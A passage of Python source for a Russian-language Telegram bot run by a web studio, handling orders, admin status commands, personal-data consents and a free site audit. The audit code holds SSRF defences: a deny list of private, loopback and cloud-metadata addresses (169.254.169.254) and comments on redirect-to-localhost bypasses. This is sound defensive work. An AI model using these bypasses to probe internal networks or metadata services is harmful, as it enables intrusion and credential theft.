        _MEM.setdefault("_orders_list", []).append(oid)
    p = user_get(uid) or {"uid": uid, "created": now_str(), "orders": []}
    p.setdefault("orders", [])
    p["orders"].append(oid)
    user_save(uid, p)
    sheet_order(order)
    try:
        log_event(uid, "cart_created", str(oid))
        _l = lead_get(uid)
        if _l and _l.get("lead_status") not in ("paid", "converted"):
            _l["lead_status"] = "cart_created"
            lead_save(_l)
        schedule_followup(uid, "cart_abandoned_1")
        schedule_followup(uid, "cart_abandoned_2")
    except Exception as e:
        print("order_new hook err", e)
    return oid


def order_get(oid):
    return _get(f"onyx:order:{oid}")


def order_save(order):
    _set(f"onyx:order:{order['id']}", order, ttl=YEAR)


# ------------------------- Админ / рефералы / услуги -------------------------
_BOT_USERNAME = [os.environ.get("BOT_USERNAME", "") or None]
# Сервис pr-cy отключён: аудит считается своими правилами (site_probe).
# Конфигурация и клиент удалены, чтобы их не включили случайно.
# PR-CY: двухшаговый API (POST задача -> GET результат). Эндпоинт и имя инструмента вынесены в env,
# т.к. точный toolName для «Анализа сайта» указан в личной документации PR-CY (по вашему ключу).
# AI-резюме: по умолчанию Anthropic; для OpenAI задайте AI_API_URL с /chat/completions
AI_API_KEY = os.environ.get("AI_API_KEY", "")
AI_API_URL = os.environ.get("AI_API_URL", "https://api.anthropic.com/v1/messages")
AI_MODEL = os.environ.get("AI_MODEL", "claude-sonnet-5")
# ADMIN_IDS / is_admin определены выше (в блоке конфигурации) - дубликаты удалены.


def bot_username():
    if _BOT_USERNAME[0]:
        return _BOT_USERNAME[0]
    me = tg("getMe")
    _BOT_USERNAME[0] = (me or {}).get("result", {}).get("username", "onyx_bot")
    return _BOT_USERNAME[0]


def subscribe(uid):
    if _REQ_ON[0]:
        seen = _REQ_CACHE.setdefault("_subscribed", set())
        if uid in seen:
            return                      # уже подписали в этом же запросе
        seen.add(uid)
    if KV_URL:
        _redis("SADD", "onyx:subscribers", str(uid))
    else:
        _MEM.setdefault("_subs", set()).add(uid)


def register_user(uid, username=None):
    upsert_user(uid, username=username)
    subscribe(uid)


def all_subscribers():
    if KV_URL:
        r = _redis("SMEMBERS", "onyx:subscribers") or []
        return [int(x) for x in r if str(x).isdigit()]
    return list(_MEM.get("_subs", set()))


def all_order_ids():
    if KV_URL:
        r = _redis("LRANGE", "onyx:orders_all", "-30", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return _MEM.get("_orders_all", [])[-30:]


def anketa_done(uid):
    p = user_get(uid)
    if not p:
        return False
    if p.get("questionnaire_status") == "filled":
        return True
    return bool(p.get("name") and p.get("contact"))


def mark_purchased(uid, items):
    """Отметить услуги как купленные (для логики обязательных платежей и кабинета)."""
    p = user_get(uid)
    if not p:
        return
    pur = set(p.get("purchased_services") or [])
    pur.update(norm_service(i) for i in items)
    p["purchased_services"] = list(pur)
    if p.get("client_status") == "new":
        p["client_status"] = "client"
    p["updated"] = now_str()
    user_save(uid, p)


def set_order_status(oid, status_key):
    o = order_get(oid)
    if not o:
        return None
    o["status"] = status_key
    o["updated"] = now_str()
    if status_key == "paid":
        o["paid"] = True
        o["payment_status"] = "paid"
        mark_purchased(o.get("uid"), o.get("items", []))
    order_save(o)
    sheet_order(o)
    return o


def add_days(iso, days):
    import datetime
    d = datetime.date.fromisoformat(iso)
    return (d + datetime.timedelta(days=days)).isoformat()


def do_broadcast(text):
    n = 0
    for uid in all_subscribers():
        if send(uid, text):
            n += 1
    return n


# ------------------------- Даты (общие хелперы) -------------------------
def today_str():
    return time.strftime("%Y-%m-%d")


def days_between(a, b):
    """b - a в днях (ISO-даты)."""
    import datetime
    try:
        return (datetime.date.fromisoformat(b) - datetime.date.fromisoformat(a)).days
    except Exception:
        return 0

# ⚠️ Сопровождение/обслуживание сайтов ОТКЛЮЧЕНО от модели ONYX.
# Подписки, автоплатежи и напоминания об оплате удалены. Оплата - только по счёту, разово.


def services_info_text():
    parts = ["ℹ️ <b>Услуги ONYX - что входит</b>"]
    for s in SERVICES:
        parts.append(f"<b>{s['name']} - {fmt_price(s)}</b>\n{s['short']}")
    return "\n\n".join(parts)


ADMIN_HELP = (
    "🔐 <b>Админ-команды</b>\n\n"
    "/orders - последние заказы\n"
    "/order N - детали заказа №N\n"
    "/status N код - сменить статус заказа\n\n"
    "Коды статусов: new, wait_pay, invoice, paid, in_work, review, done, canceled"
)


def orders_recent(n=15):
    if KV_URL:
        res = _redis("LRANGE", "onyx:orders", str(-n), "-1")
        return [int(x) for x in (res or [])]
    return _MEM.get("_orders_list", [])[-n:]


def admin_orders_list(n=15):
    ids = orders_recent(n)
    if not ids:
        return "Заказов пока нет."
    lines = ["📋 <b>Последние заказы:</b>", ""]
    for oid in ids:
        o = order_get(oid)
        if not o:
            continue
        st = STATUS.get(o.get("status"), o.get("status"))
        lines.append(f"№{oid} - {o.get('total', 0)} ₽ - {st} - {o.get('payment_type', '')}")
    lines.append("\nПодробнее: /order N   ·   Статус: /status N код")
    return "\n".join(lines)


def admin_order_detail(id_str):
    try:
        oid = int(id_str)
    except ValueError:
        return "Некорректный номер."
    o = order_get(oid)
    if not o:
        return f"Заказ №{id_str} не найден."
    u = user_get(o.get("uid")) or {}
    st = STATUS.get(o.get("status"), o.get("status"))
    lines = [
        f"📦 <b>Заказ №{oid}</b>",
        f"Статус: {st}",
        f"Сумма: {o.get('total', 0)} ₽",
        f"Оплата: {o.get('payment_type', '')} · оплачен: {'да' if o.get('paid') else 'нет'}",
        f"Услуги: {', '.join(o.get('items', []))}",
        f"Клиент: {u.get('name', '-')} / {u.get('contact', '-')} / @{u.get('username', '-')} (id {o.get('uid')})",
        f"Создан: {o.get('created', '')}",
    ]
    if o.get("company"):
        lines.append(f"Юрлицо: {o['company']}, ИНН {o.get('inn', '')}, {o.get('email', '')}")
    lines.append(f"\nСменить статус: /status {oid} код")
    return "\n".join(lines)


def admin_set_status(id_str, key):
    try:
        oid = int(id_str)
    except ValueError:
        return "Некорректный номер."
    if key not in STATUS:
        return f"Неизвестный код. Доступно: {', '.join(STATUS.keys())}"
    o = order_get(oid)
    if not o:
        return f"Заказ №{id_str} не найден."
    o["status"] = key
    o["updated"] = now_str()
    if key == "paid":
        o["paid"] = True
        o["payment_status"] = "paid"
        mark_purchased(o.get("uid"), o.get("items", []))
    order_save(o)
    sheet_order(o)
    cuid = o.get("uid")
    if cuid:
        send(cuid, f"🔔 Статус вашего заказа <b>№{oid}</b>: {STATUS[key]}")
        if key == "done":
            p = user_get(cuid) or {}
            review_start(cuid, cuid, p.get("username", ""), order_id=oid, intro=True)
    return f"✅ Заказ №{oid} → {STATUS[key]}. Клиент уведомлён."


# ------------------------- Этап 1: клиент, профиль, статусы, витрины -------------------------
CLIENT_STATUS_RU = {"new": "новый", "client": "клиент", "vip": "VIP"}
Q_STATUS_RU = {"not_filled": "не заполнена", "filled": "заполнена"}

SUPPORT_TEXT = (
    "🆘 <b>Поддержка ONYX</b>\n\n"
    "Если у вас возник вопрос по сайту, заказу, оплате или работе сервиса - напишите нам.\n\n"
    f"✈️ Telegram: @{MANAGER_USERNAME}\n"
    f"✉️ Email: {ONYX_EMAIL}\n"
    f"📞 Телефон: {ONYX_PHONE}"
)


# ============================================================================
#  СОГЛАСИЯ И ЮРИДИЧЕСКИЕ ДОКУМЕНТЫ (152-ФЗ)
#  Принцип: НЕ показываем документы при /start. Согласие запрашивается ровно
#  там, где начинается обработка, требующая согласия - перед реквизитами/ИНН.
#  Согласие на рекламу - отдельное (ст. 10.1 152-ФЗ), только по своей инициативе.
# ============================================================================
CONSENT_VERSION = os.environ.get("CONSENT_VERSION", "1.0")

# Ссылки на опубликованные документы. Пока не заданы - бот показывает текст сам.
DOC_URLS = {
    "privacy": os.environ.get("DOC_PRIVACY_URL", ""),      # Политика конфиденциальности
    "pdn": os.environ.get("DOC_PDN_URL", ""),              # Политика обработки ПДн
    "consent": os.environ.get("DOC_CONSENT_URL", ""),      # Согласие на обработку ПДн
    "terms": os.environ.get("DOC_TERMS_URL", ""),          # Пользовательское соглашение
    "offer": os.environ.get("DOC_OFFER_URL", ""),          # Публичная оферта
}

CONSENT_SHORT = """# 📄 Согласие на обработку данных

Чтобы подготовить счёт, нам нужны ваши реквизиты - это персональные данные,
и на их обработку нужно ваше согласие.

- Используем только для договора, счёта и чека
- Никому не передаём
- Рекламу без отдельного разрешения не шлём

> Продолжая, вы принимаете **Согласие на обработку персональных данных**
> и подтверждаете, что ознакомились с Политикой конфиденциальности."""

MARKETING_ASK = """## 🔔 Полезные предложения ONYX

Хотите получать акции, новые услуги и материалы о сайтах?

> Это необязательно - на работу по вашему заказу никак не влияет.
> Отписаться можно в один клик."""


def consent_get(uid, kind="pdn"):
    return _get(f"onyx:consent:{kind}:{uid}")


def consent_save(uid, kind="pdn", accepted=True, username=""):
    """Фиксируем факт, дату, время и версию - это доказательство для РКН."""
    rec = {"telegram_id": uid, "username": username or "", "consent_type": kind,
           "consent_version": CONSENT_VERSION, "accepted": bool(accepted),
           "accepted_at": now_str(), "source": "bot",
           "doc_url": DOC_URLS.get("consent" if kind == "pdn" else "privacy", "")}
    _set(f"onyx:consent:{kind}:{uid}", rec, ttl=YEAR * 3)
    sheet_post("Consents", rec)
    try:
        journal_add(client_id_of(uid), f"consent_{kind}_" + ("accepted" if accepted else "declined"),
                    extra=CONSENT_VERSION)
    except Exception as e:
        print("consent journal err", e)
    return rec


def consent_revoke(uid, kind="pdn", username=""):
    rec = consent_get(uid, kind) or {}
    rec.update({"telegram_id": uid, "username": username or rec.get("username", ""),
                "consent_type": kind, "consent_version": rec.get("consent_version", CONSENT_VERSION),
                "accepted": False, "revoked_at": now_str(), "source": "bot"})
    _set(f"onyx:consent:{kind}:{uid}", rec, ttl=YEAR * 3)
    sheet_post("Consents", rec)
    return rec


def has_consent(uid, kind="pdn"):
    """Согласие действительно только если принято И совпадает версия документа.
    Изменили документ → подняли CONSENT_VERSION → бот спросит заново."""
    r = consent_get(uid, kind)
    return bool(r and r.get("accepted") and r.get("consent_version") == CONSENT_VERSION)


def docs_kb(back_to=None):
    """back_to - куда возвращаться. Если клиент открыл документы из экрана согласия,
    он должен иметь возможность вернуться и нажать «Принимаю», а не застрять."""
    rows = []
    titles = [("privacy", "🔐 Политика конфиденциальности"),
              ("pdn", "📋 Политика обработки перс. данных"),
              ("consent", "✍️ Согласие на обработку данных"),
              ("terms", "📘 Пользовательское соглашение"),
              ("offer", "🧾 Публичная оферта")]
    for key, label in titles:
        url = DOC_URLS.get(key)
        rows.append([{"text": label, "url": url} if url
                     else {"text": label, "callback_data": f"doc:{key}"}])
    rows.append([{"text": "👤 Мои данные и согласия", "callback_data": "doc:my"}])
    if back_to == "consent":
        rows.append([{"text": "✅ Всё прочитал - принимаю", "callback_data": "consent:ok"}])
        rows.append([{"text": "⬅️ Вернуться к согласию", "callback_data": "checkout:go"}])
    else:
        rows.append([{"text": "🏠 Назад в меню", "callback_data": "b:home"}])
    return {"inline_keyboard": rows}


DOCS_TEXT = f"""# 📄 Документы ONYX

Здесь собрано всё, что регулирует нашу работу и обработку ваших данных.

| | |
|---|---|
| Оператор данных | самозанятые ONYX WEB |
| Вопросы по ПДн | `{ONYX_EMAIL}` |"""


def my_data_text(uid):
    p = user_get(uid) or {}
    c = consent_get(uid, "pdn") or {}
    m = consent_get(uid, "marketing") or {}
    lines = ["# 👤 Ваши данные и согласия", "", "### Что у нас есть"]
    have = []
    if p.get("name"):
        have.append("имя / название компании")
    if p.get("phone") or p.get("contact"):
        have.append("контакты")
    if _get(f"onyx:quest:{uid}"):
        have.append("ответы анкеты")
    if p.get("orders"):
        have.append(f"заказы ({len(p.get('orders', []))})")
    lines.append("\n".join(f"- {x}" for x in have) if have else "- пока ничего")
    lines += ["", "### Согласия",
              "- [x] на обработку данных - принято "
              f"{c.get('accepted_at', '')} (версия {c.get('consent_version', '-')})"
              if c.get("accepted") else "- [ ] на обработку данных - не давалось",
              "- [x] на рекламные сообщения" if m.get("accepted")
              else "- [ ] на рекламные сообщения - не давалось",
              "", "> Вы можете отозвать согласие или запросить удаление данных. "
              "Ответим в течение 10 рабочих дней."]
    return "\n".join(lines)


def my_data_kb(uid):
    rows = []
    if consent_get(uid, "marketing") and (consent_get(uid, "marketing") or {}).get("accepted"):
        rows.append([{"text": "🔕 Отписаться от рассылок", "callback_data": "doc:unsub"}])
    else:
        rows.append([{"text": "🔔 Подписаться на предложения", "callback_data": "doc:sub"}])
    rows.append([{"text": "🗑 Запросить удаление данных", "callback_data": "doc:erase"}])
    rows.append([{"text": "⬅️ К документам", "callback_data": "doc:home"}])
    return {"inline_keyboard": rows}


def support_kb():
    return {"inline_keyboard": [
        [{"text": "🆘 Написать в поддержку", "url": f"https://t.me/{MANAGER_USERNAME}"}],
        [{"text": "📨 Создать обращение", "callback_data": "sup:new"}],
        [{"text": "🗂 Мои обращения", "callback_data": "sup:my"}],
        [{"text": "❓ Помощь / FAQ", "callback_data": "sup:faq"}],
        [{"text": "👨‍💻 Написать разработчику", "url": f"https://t.me/{DEVELOPER_USERNAME}"}],
        [{"text": "🏠 Назад в меню", "callback_data": "b:home"}],
    ]}
# ONYX_INFO - удалён: раздел заменён (см. «Поддержка» / «Информативный ONYX»).
# Порядок разделов - по частоте обращений: сначала «что с моим заказом»,
# потом «дослать материалы», остальное ниже.
CABINET_KB = {"inline_keyboard": [
    [{"text": "📦 Статус заказа", "callback_data": "cab:orders"}],
    [{"text": "📎 Материалы для сайта", "callback_data": "up:open"}],
    [{"text": "📬 Полезные письма", "callback_data": "cab:info"}],
    [{"text": "👤 Мои данные", "callback_data": "cab:profile"}],
    [{"text": "⭐ Оценить сервис", "callback_data": "cab:review"}],
    [{"text": "🆘 Поддержка", "callback_data": "cab:support"}],
    [{"text": "🎯 Записаться на консультацию", "callback_data": "cons:offer"}],
    [{"text": "🏠 В меню", "callback_data": "b:home"}],
]}


def render_profile(uid):
    p = user_get(uid) or {}
    un = p.get("username")
    un = f"@{un}" if un else "не указано"
    cs = CLIENT_STATUS_RU.get(p.get("client_status", "new"), p.get("client_status", "new"))
    qs = Q_STATUS_RU.get(p.get("questionnaire_status", "not_filled"), p.get("questionnaire_status", "not_filled"))
    return (
        "👤 <b>Мой профиль</b>\n\n"
        f"Имя: {p.get('name') or 'не указано'}\n"
        f"Telegram ID: {uid}\n"
        f"Username: {un}\n"
        f"Телефон: {p.get('phone') or 'не указано'}\n"
        f"Город: {p.get('city') or 'не указано'}\n"
        f"Ниша: {p.get('niche') or 'не указано'}\n\n"
        f"Статус клиента: {cs}\n"
        f"Статус анкеты: {qs}"
    )


def render_orders(uid):
    """«Мои покупки»: активные и купленные услуги. Возвращает (text, kb)."""
    p = user_get(uid) or {}
    lines = ["🛍 <b>Мои покупки</b>", ""]

    active = [norm_service(s) for s in (p.get("active_services") or [])]
    purchased = [norm_service(s) for s in (p.get("purchased_services") or [])]

    lines.append("⚡ <b>Активные услуги:</b>")
    if active:
        for cid in active:
            lines.append(f"• {SERVICE.get(cid, {}).get('name', cid)}")
    else:
        lines.append("- пока нет")
    lines.append("")

    lines.append("✅ <b>Купленные услуги:</b>")
    if purchased:
        for cid in purchased:
            lines.append(f"• {SERVICE.get(cid, {}).get('name', cid)}")
    else:
        lines.append("- пока нет")
    lines.append("")

    sub_kb = None
    orders = p.get("orders", [])
    if orders:
        lines.append("")
        lines.append("📦 <b>Заказы:</b>")
        for oid in orders[-10:]:
            o = order_get(oid)
            if not o:
                continue
            key = proj_status(o)
            items = ", ".join(SERVICE.get(c, {}).get("name", c) for c in o.get("items", [])) or "-"
            lines.append(f"№{oid} - {items} - {fmt_amount(o.get('total', 0))} - {ps_label(key)}")
    return "\n".join(lines), sub_kb


# ------------------------- Этап 7: Бесплатный аудит (PR-CY + AI) -------------------------
AUDIT_STATUS = ("created", "waiting_prcy", "prcy_received", "ai_summary_ready", "sent_to_client", "failed")

AUDIT_INTRO = ("🔍 <b>Бесплатный аудит сайта</b>\n\n"
               "Пришлите адрес сайта - разберём его за полминуты и покажем понятным языком: "
               "что отпугивает клиентов, во что это обходится и как мы это закрываем.\n\n"
               "Например: <code>onyx-web.ru</code>")

AUDIT_UNAVAILABLE = ("Сейчас сервис аудита временно недоступен. Мы сохранили вашу заявку "
                     "и подготовим аудит вручную.")


def valid_url(text):
    """Проверка ссылки. Возвращает нормализованный URL или None."""
    t = (text or "").strip().split()[0] if (text or "").strip() else ""
    if not t:
        return None
    if not re.match(r"^https?://", t, re.I):
        t = "https://" + t
    m = re.match(r"^https?://([a-z0-9-]+(\.[a-z0-9-]+)+)(/.*)?$", t, re.I)
    return t if m else None


def url_domain(url):
    try:
        return urllib.parse.urlparse(url).netloc.replace("www.", "") or url
    except Exception:
        return url


AUDIT_FRESH_DAYS = 30  # сколько дней аудит считается актуальным


def normalize_domain(url):
    """Нормализованный домен: нижний регистр, без www, без хвоста."""
    d = url_domain(url).lower().strip().strip("/")
    if d.startswith("www."):
        d = d[4:]
    return d


def audit_registry_set(domain, aid):
    _set(f"onyx:audit_domain:{domain}", {"audit_id": aid, "at": _ts()}, ttl=YEAR)


def audit_registry_get(domain):
    """Возвращает (audit, is_fresh) для домена или (None, False)."""
    rec = _get(f"onyx:audit_domain:{domain}")
    if not rec:
        return (None, False)
    a = audit_get(rec.get("audit_id"))
    if not a:
        return (None, False)
    fresh = (_ts() - int(rec.get("at", 0))) < AUDIT_FRESH_DAYS * DAY
    return (a, fresh)


def next_audit_id():
    if KV_URL:
        return int(_redis("INCR", "onyx:audit_seq") or 1)
    _MEM["_audit_seq"] = _MEM.get("_audit_seq", 0) + 1
    return _MEM["_audit_seq"]


def audit_get(aid):
    return _get(f"onyx:audit:{aid}")


def audit_save(a, to_sheet=True):
    a["updated_at"] = now_str()
    _set(f"onyx:audit:{a['audit_id']}", a, ttl=YEAR)
    if to_sheet:
        sheet_audit(a)
    return a


def audit_new(uid, username, url):
    aid = next_audit_id()
    a = {"audit_id": aid, "telegram_id": uid, "username": username or "",
         "website_url": url, "prcy_raw_result": "", "ai_summary": "",
         "weak_points": "", "recommended_services": "", "estimated_onyx_price": "",
         "market_price_comparison": "", "status": "created",
         "created_at": now_str(), "updated_at": now_str()}
    if KV_URL:
        _redis("RPUSH", "onyx:audits_all", str(aid))
    else:
        _MEM.setdefault("_audits_all", []).append(aid)
    return audit_save(a)


def audits_pending_add(aid):
    if KV_URL:
        _redis("RPUSH", "onyx:audits_pending", str(aid))
    else:
        _MEM.setdefault("_audits_pending", []).append(aid)


def audits_pending_all():
    if KV_URL:
        r = _redis("LRANGE", "onyx:audits_pending", "0", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return list(_MEM.get("_audits_pending", []))


def audits_pending_remove(aid):
    if KV_URL:
        _redis("LREM", "onyx:audits_pending", "0", str(aid))
    else:
        lst = _MEM.get("_audits_pending", [])
        if aid in lst:
            lst.remove(aid)


def sheet_audit(a):
    sheet_post("Audits", {
        "audit_id": a.get("audit_id", ""), "telegram_id": a.get("telegram_id", ""),
        "username": a.get("username", ""), "website_url": a.get("website_url", ""),
        "prcy_raw_result": (a.get("prcy_raw_result") or "")[:45000],
        "ai_summary": a.get("ai_summary", ""), "weak_points": a.get("weak_points", ""),
        "recommended_services": a.get("recommended_services", ""),
        "estimated_onyx_price": a.get("estimated_onyx_price", ""),
        "market_price_comparison": a.get("market_price_comparison", ""),
        "status": a.get("status", ""), "created_at": a.get("created_at", ""),
        "updated_at": a.get("updated_at", ""),
    })


# ---- PR-CY API ----








# ---------------------------------------------------------------------------
#  Защита от SSRF
#
#  Аудит - единственное место, где бот ходит по адресу, который назвал
#  пользователь. Без ограничений это превращает бота в разведчика внутренней
#  сети: он находится внутри периметра облака, а результат запроса (заголовок
#  страницы, текст ошибки) возвращается клиенту в отчёте.
#
#  Проверяем не строку, а реальные IP-адреса, в которые разрешается имя,
#  и делаем это заново после каждого редиректа: домен может отдать 302
#  на 127.0.0.1, и проверка исходной строки такой обход не заметит.
# ---------------------------------------------------------------------------

SSRF_ALLOWED_SCHEMES = ("http", "https")
SSRF_ALLOWED_PORTS = (80, 443, 8080, 8443)
SSRF_MAX_REDIRECTS = 3


def _ip_is_public(ip_str):
    """Адрес принадлежит обычному интернету, а не служебным диапазонам."""
    try:
        ip = ipaddress.ip_address(ip_str)
    except ValueError:
        return False
    return not (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified
                # 169.254.169.254 и соседи - метаданные облака
                or ip in ipaddress.ip_network("169.254.0.0/16")
                or (ip.version == 6 and ip.ipv4_mapped is not None
                    and not _ip_is_public(str(ip.ipv4_mapped))))


def resolve_ips(host, port):
    """Все адреса домена. Возвращает (список, текст_ошибки)."""
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except Exception as e:
        return [], f"{type(e).__name__}: {str(e)[:80]}"
    out = []
    for info in infos:
        ip = str(info[4][0]).split("%")[0]   # у IPv6 бывает суффикс зоны
        if ip not in out:
            out.append(ip)
    return out, ""


def ssrf_check(url):
    """Возвращает (можно_ли, причина_отказа). Причина - для лога, не для клиента."""
    try:
        u = urllib.parse.urlparse(url)
    except Exception:
        return False, "адрес не разбирается"
    if u.scheme.lower() not in SSRF_ALLOWED_SCHEMES:
        return False, f"схема {u.scheme!r} не разрешена"
    host = (u.hostname or "").strip()
    if not host:
        return False, "пустой домен"
    port = u.port or (443 if u.scheme == "https" else 80)
    if port not in SSRF_ALLOWED_PORTS:
        return False, f"порт {port} не разрешён"
    # Домен вида .internal / .local в облаках указывает на служебные сервисы
    if host.endswith((".internal", ".local", ".localdomain")) or host == "localhost":
        return False, "служебный домен"
    ips, err = resolve_ips(host, port)
    if err:
        return False, f"домен не разрешается ({err})"
    if not ips:
        return False, "у домена нет адресов"

    # Блокируем, только если ВСЕ адреса служебные. Раньше хватало одного:
    # у сайтов за Cloudflare в выдаче попадаются адреса вроде 64:ff9b::/96
    # (NAT64), которые ipaddress помечает зарезервированными, - и запрос
    # отклонялся, хотя обычный публичный адрес рядом был.
    public = [ip for ip in ips if _ip_is_public(ip)]
    if not public:
        return False, f"все адреса служебные: {', '.join(ips[:3])}"
    return True, ""


def _fetch(url, timeout=6, max_bytes=400000):
    """Скачать страницу. Возвращает (код, заголовки, текст, секунды, финальный_url).

    Редиректы обрабатываем вручную: каждый следующий адрес проходит ту же
    проверку, что и первый."""
    t0 = time.time()
    hops = 0
    while True:
        allowed, why = ssrf_check(url)
        if not allowed:
            log_error("ssrf", f"запрос отклонён: {why} · {url[:120]}", notify=False)
            return 0, {}, "адрес недоступен для проверки", time.time() - t0, url
        code, hdrs, body, secs, final = _fetch_once(url, timeout, max_bytes)
        loc = (hdrs or {}).get("Location") or (hdrs or {}).get("location")
        if code in (301, 302, 303, 307, 308) and loc and hops < SSRF_MAX_REDIRECTS:
            hops += 1
            url = urllib.parse.urljoin(url, loc)
            continue
        return code, hdrs, body, time.time() - t0, final


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Автоматический переход по редиректу обошёл бы проверку адреса,
    поэтому переходим сами - с повторной проверкой на каждом шаге."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_SSRF_OPENER = urllib.request.build_opener(_NoRedirect)


def _fetch_once(url, timeout=6, max_bytes=400000):
    t0 = time.time()
    req = urllib.request.Request(url, headers={
        "User-Agent": UA, "Accept-Language": "ru,en;q=0.8",
        "Accept-Encoding": "identity"})
    try:
        with _SSRF_OPENER.open(req, timeout=timeout) as r:
            raw = r.read(max_bytes)
            enc = "utf-8"
            ct = (r.headers.get("Content-Type") or "").lower()
            m = re.search(r"charset=([\w-]+)", ct)
            if m:
                enc = m.group(1)
            body = raw.decode(enc, "ignore")
            if "charset=windows-1251" in body[:2000].lower() and enc == "utf-8":
                body = raw.decode("cp1251", "ignore")
            return r.getcode(), dict(r.headers), body, time.time() - t0, r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, dict(getattr(e, "headers", {}) or {}), "", time.time() - t0, url
    except Exception as e:
        return 0, {}, str(e)[:200], time.time() - t0, url


def _head_ok(url, timeout=3):
    """Проверка robots.txt и sitemap.xml. Адрес производный от пользовательского,
    поэтому проходит ту же проверку, что и основной запрос."""
    allowed, why = ssrf_check(url)
    if not allowed:
        log_error("ssrf", f"вспомогательный запрос отклонён: {why}", notify=False)
        return False, ""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA}, method="GET")
        with _SSRF_OPENER.open(req, timeout=timeout) as r:
            return r.getcode() == 200, (r.read(2000) or b"").decode("utf-8", "ignore")
    except Exception:
        return False, ""


def site_probe(url):
    """Собрать факты о сайте. Ничего не оцениваем - только измеряем."""
    if not url.startswith("http"):
        url = "https://" + url.lstrip("/")
    p = {"input_url": url, "domain": url_domain(url)}

    code, hdrs, body, secs, final = _fetch(url)
    # если https не открылся - пробуем http, это само по себе находка
    if code == 0 and url.startswith("https://"):
        code, hdrs, body, secs, final = _fetch("http://" + url_domain(url))
        p["https_failed"] = True
    p.update({"status": code, "load_sec": round(secs, 2), "final_url": final,
              "https": str(final).startswith("https://"), "size_kb": len(body) // 1024,
              "reachable": bool(code and 200 <= code < 400 and body)})
    if not p["reachable"]:
        p["error"] = body[:200] if not code else f"HTTP {code}"
        return p

    low = body.lower()
    head = low[:20000]
    p["server"] = (hdrs.get("Server") or "")[:60]
    p["hsts"] = bool(hdrs.get("Strict-Transport-Security"))
    p["gzip"] = "gzip" in (hdrs.get("Content-Encoding") or "").lower()

    p["viewport"] = "name=\"viewport\"" in head or "name='viewport'" in head
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.S | re.I)
    p["title"] = re.sub(r"\s+", " ", m.group(1)).strip()[:200] if m else ""
    m = re.search(r'<meta[^>]+name=["\']description["\'][^>]+content=["\'](.*?)["\']', body, re.S | re.I)
    p["description"] = re.sub(r"\s+", " ", m.group(1)).strip()[:300] if m else ""
    p["h1"] = [re.sub(r"<[^>]+>", "", x).strip()[:120]
               for x in re.findall(r"<h1[^>]*>(.*?)</h1>", body, re.S | re.I)][:5]
    p["h2_count"] = len(re.findall(r"<h2[^>]*>", low))
    p["og"] = "og:title" in head
    p["favicon"] = "rel=\"icon\"" in head or "rel='icon'" in head or "shortcut icon" in head

    p["analytics"] = sorted({name for sig, name in ANALYTICS if sig in low})
    p["constructor"] = next((name for sig, name in CONSTRUCTORS if sig in low), "")

    p["forms"] = len(re.findall(r"<form[\b>]", low))
    p["inputs"] = len(re.findall(r"<input[\b>]", low))
    p["tel"] = len(re.findall(r'href=["\']tel:', low))
    p["mail"] = len(re.findall(r'href=["\']mailto:', low))
    p["wa"] = "wa.me" in low or "api.whatsapp" in low
    p["tg"] = "t.me/" in low
    p["map"] = "yandex.ru/map" in low or "google.com/maps" in low or "ymaps" in low
    p["images"] = len(re.findall(r"<img[\b>]", low))
    p["lazy"] = len(re.findall(r'loading=["\']lazy', low))

    # признаки назначения сайта - нужны для внутреннего определения цели
    txt = re.sub(r"<script.*?</script>|<style.*?</style>", " ", low, flags=re.S)
    txt = re.sub(r"<[^>]+>", " ", txt)
    p["text_len"] = len(re.sub(r"\s+", " ", txt).strip())
    def cnt(*words):
        return sum(txt.count(w) for w in words)
    p["sig_cart"] = cnt("корзин", "добавить в корзину", "оформить заказ", "checkout")
    p["sig_catalog"] = cnt("каталог", "товар", "ассортимент", "продукци", "артикул")
    p["sig_booking"] = cnt("записаться", "онлайн-запись", "запись на", "бронирован", "расписание")
    p["sig_lead"] = cnt("оставить заявку", "заказать звонок", "оставьте заявку",
                        "получить консультацию", "рассчитать стоимость", "заявка")
    p["sig_price"] = cnt("цена", "стоимость", "прайс", "руб", "₽")
    p["sig_about"] = cnt("о нас", "о компании", "наша команда", "контакты")
    p["sig_portfolio"] = cnt("портфолио", "наши работы", "кейс", "проекты")
    p["sig_reviews"] = cnt("отзыв")

    # год в подвале - намёк на возраст/заброшенность
    years = re.findall(r"©\s*(?:\d{4}\s*[---]\s*)?(20\d{2})", body)
    p["footer_year"] = max((int(y) for y in years), default=0)

    p["robots"] = _head_ok(f"https://{p['domain']}/robots.txt")[0]
    ok_sm, sm_body = _head_ok(f"https://{p['domain']}/sitemap.xml")
    p["sitemap"] = ok_sm and ("<urlset" in sm_body or "<sitemapindex" in sm_body)
    return p


def detect_site_goal(p):
    """Определить, ЗАЧЕМ клиенту сайт. Внутренняя оценка - клиенту не показываем.
    Возвращает (goal, уверенность 0..1, короткое пояснение для админа)."""
    s = {
        "catalog": p.get("sig_catalog", 0) * 1.0 + p.get("sig_cart", 0) * 2.0,
        "booking": p.get("sig_booking", 0) * 2.5,
        "leads": p.get("sig_lead", 0) * 2.0 + p.get("forms", 0) * 3.0 + p.get("tel", 0) * 1.0,
        "visitka": p.get("sig_about", 0) * 1.2 + (3.0 if p.get("text_len", 0) < 2500 else 0),
    }
    if p.get("sig_portfolio", 0) > 3:
        s["visitka"] += 2
    if p.get("forms", 0) == 0 and p.get("sig_lead", 0) == 0:
        s["leads"] = max(0, s["leads"] - 2)
        s["visitka"] += 2
    goal = max(s, key=s.get)
    total = sum(s.values()) or 1
    conf = round(s[goal] / total, 2)
    why = ", ".join(f"{k}={round(v, 1)}" for k, v in sorted(s.items(), key=lambda x: -x[1]))
    return goal, conf, why


# --- Находки: что не так, чем это грозит, что даст исправление ---
def audit_findings(p):
    """Список находок. Каждая: заголовок, риск, выгода от исправления, вес, услуги."""
    f = []
    add = lambda t, risk, gain, sev, svc=(): f.append(
        {"title": t, "risk": risk, "gain": gain, "sev": sev, "svc": list(svc)})

    if not p.get("https") or p.get("https_failed"):
        add("Сайт без защищённого соединения (HTTPS)",
            "Браузер показывает посетителю предупреждение «Не защищено» - часть людей "
